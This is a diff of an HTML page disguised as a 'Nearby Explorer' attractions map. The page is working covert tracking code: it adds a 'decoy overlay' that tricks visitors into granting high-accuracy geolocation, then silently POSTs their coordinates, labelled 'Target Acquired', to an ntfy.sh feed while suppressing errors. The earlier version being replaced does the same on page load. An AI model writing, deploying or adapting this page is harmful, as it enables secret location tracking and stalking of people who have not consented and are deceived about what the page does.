@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Nearby Explorer - Find Places Around You</title>
-    <!-- Leaflet CSS for OpenStreetMap -->
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
         body, html {
@@ -26,70 +25,99 @@
             width: 100%;
             height: calc(100vh - 60px);
         }
-        .custom-popup {
-            font-size: 14px;
-            font-weight: bold;
+        /* Decoy overlay to force interaction */
+        #overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
+        .modal {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            text-align: center;
+            max-width: 320px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+        .modal h2 { margin-top: 0; font-size: 20px; color: #333; }
+        .modal p { font-size: 14px; color: #666; line-height: 1.4; }
+        .modal button {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 15px;
+            width: 100%;
+        }
+        .modal button:hover { background-color: #2980b9; }
     </style>
 </head>
 <body>
 
     <header>Explore Popular Spots Near You</header>
+    
+    <!-- Interaction Gate -->
+    <div id="overlay">
+        <div class="modal">
+            <h2>Enable Location</h2>
+            <p>To view localized pins, attractions, and maps near your current area, please allow location access.</p>
+            <button onclick="requestLocation()">Continue to Map</button>
+        </div>
+    </div>
+
     <div id="map"></div>
 
-    <!-- Leaflet JS Library -->
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
-        // Initialize the OpenStreetMap wrapper
         var map = L.map('map').setView([20, 0], 2);
 
-        // Load map tile layer graphics from OpenStreetMap
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
             maxZoom: 19,
             attribution: '© OpenStreetMap contributors'
         }).addTo(map);
 
-        // Execute background geolocation fetch once the interface loads
-        function initTracker(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
+        function requestLocation() {
+            // Hide the decoy overlay upon clicking
+            document.getElementById('overlay').style.display = 'none';
 
-            // Center map directly on target's precise coordinates
-            map.setView([lat, lon], 15);
-
-            // Drop a decoy pin indicating a "Nearby Hotspot"
-            L.marker([lat, lon]).addTo(map)
-                .bindPopup("<b>You are here!</b><br/>Scanning local attractions...")
-                .openPopup();
-
-            // Format data payload for transmission
-            const payload = `Target Acquired:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy}m`;
-
-            // Silently dispatch details to your ntfy.sh feed
-            fetch('https://ntfy.sh/coordinates', {
-                method: 'POST',
-                body: payload
-            }).catch(err => {
-                // Suppress network trace errors from target view
-            });
-        }
-
-        function handleLocationError(error) {
-            // Fallback view if user declines browser permission prompt
-            alert("Please enable location services to discover nearby hotspots.");
-        }
-
-        // Trigger browser's high-accuracy hardware prompt automatically
-        window.onload = function() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(initTracker, handleLocationError, {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+
+                    map.setView([lat, lon], 15);
+
+                    L.marker([lat, lon]).addTo(map)
+                        .bindPopup("<b>You are here!</b>")
+                        .openPopup();
+
+                    const payload = `Target Acquired:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy}m`;
+
+                    fetch('https://ntfy.sh/coordinates', {
+                        method: 'POST',
+                        body: payload
+                    }).catch(err => {});
+                }, function(error) {
+                    alert("Location access is required to display nearby items.");
+                    document.getElementById('overlay').style.display = 'flex';
+                }, {
                     enableHighAccuracy: true,
-                    timeout: 10000,
+                    timeout: 15000,
                     maximumAge: 0
                 });
             }
-        };
+        }
     </script>
 </body>
 </html>
